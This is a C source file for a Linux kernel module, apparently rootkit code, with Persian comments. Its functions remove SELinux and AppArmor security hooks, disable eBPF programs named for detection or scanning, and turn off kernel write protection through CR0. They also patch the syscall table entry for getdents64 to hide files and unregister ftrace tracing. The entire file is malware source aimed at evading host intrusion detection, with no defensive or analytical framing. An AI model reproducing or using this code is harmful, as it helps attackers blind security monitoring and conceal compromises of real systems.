#include <linux/module.h>
#include <linux/kprobes.h>
#include "stealth.h"

// دور زدن LSM (Linux Security Modules)
void bypass_lsm_hooks(void) {
    struct security_hook_list *hlist;
    struct hlist_head *head = get_lsm_head();
    
    hlist_for_each_entry(hlist, head, list) {
        // غیرفعال‌سازی هوک‌های امنیتی
        if (strstr(hlist->lsm, "selinux") || strstr(hlist->lsm, "apparmor")) {
            hlist_del(&hlist->list);
        }
    }
}

// دور زدن eBPF 
void bypass_ebpf_detection(void) {
    struct bpf_prog *prog;
    struct bpf_prog_array *array = get_bpf_prog_array();
    
    for (int i = 0; i < array->items; i++) {
        prog = array->progs[i].prog;
        if (prog && prog->aux && prog->aux->name) {
            if (strstr(prog->aux->name, "detect") || strstr(prog->aux->name, "scan")) {
                bpf_prog_put(prog);
                array->progs[i].prog = NULL;
            }
        }
    }
}

// دور زدن سیستم‌های HIDS
void bypass_hids(void) {
    // غیرفعال‌سازی kernel module signing enforcement
    write_cr0(read_cr0() & (~0x10000));
    
    // دستکاری syscall table برای پنهان‌سازی
    unsigned long *syscall_table = get_syscall_table();
    syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    
    // غیرفعال‌سازی ftrace
    ftrace_ops *ops = get_ftrace_ops();
    if (ops) {
        unregister_ftrace_function(ops);
    }
}
